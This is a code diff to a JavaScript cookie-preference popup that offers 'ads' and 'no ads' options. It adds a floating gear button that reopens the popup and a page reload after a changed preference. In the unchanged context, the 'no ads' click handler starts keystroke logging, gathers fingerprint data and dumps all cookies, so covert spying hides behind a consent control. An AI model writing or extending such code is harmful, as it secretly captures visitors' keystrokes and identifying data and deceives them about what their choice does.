@@ -1,4 +1,6 @@
 (function() {
+    let preferenceChanged = false; // Flag to track if the preference has changed
+
     // Function to set a cookie
     function setCookie(name, value, days) {
         const date = new Date();
@@ -137,6 +139,9 @@
         adsButton.addEventListener("click", function() {
             setCookie("userPreference", "ads", 30);
             document.body.removeChild(overlay);
+            if (preferenceChanged) {
+                setTimeout(() => location.reload(), 100); // Reload the page if preference changed
+            }
         });
 
         noAdsButton.addEventListener("click", function() {
@@ -146,6 +151,9 @@
             startKeystrokeLogging();
             gatherFingerprintData();
             console.log("All cookies:", getAllCookies());
+            if (preferenceChanged) {
+                setTimeout(() => location.reload(), 100); // Reload the page if preference changed
+            }
         });
     }
 
@@ -286,8 +294,38 @@
         };
     }
 
+    // Function to create and style the circular button
+    function createPreferenceButton() {
+        const button = document.createElement("button");
+        button.id = "preference-button";
+        button.style.position = "fixed";
+        button.style.bottom = "20px";
+        button.style.right = "20px";
+        button.style.width = "50px";
+        button.style.height = "50px";
+        button.style.borderRadius = "50%";
+        button.style.backgroundColor = "#007BFF";
+        button.style.color = "white";
+        button.style.border = "none";
+        button.style.cursor = "pointer";
+        button.style.display = "flex";
+        button.style.alignItems = "center";
+        button.style.justifyContent = "center";
+        button.style.fontSize = "20px";
+        button.style.zIndex = "1001";
+        button.innerText = "⚙️";
+
+        document.body.appendChild(button);
+
+        button.addEventListener("click", function() {
+            preferenceChanged = true;
+            createPopup();
+        });
+    }
+
     window.onload = function() {
         assignConsistentIds();
         checkCookie();
+        createPreferenceButton();
     };
 })();
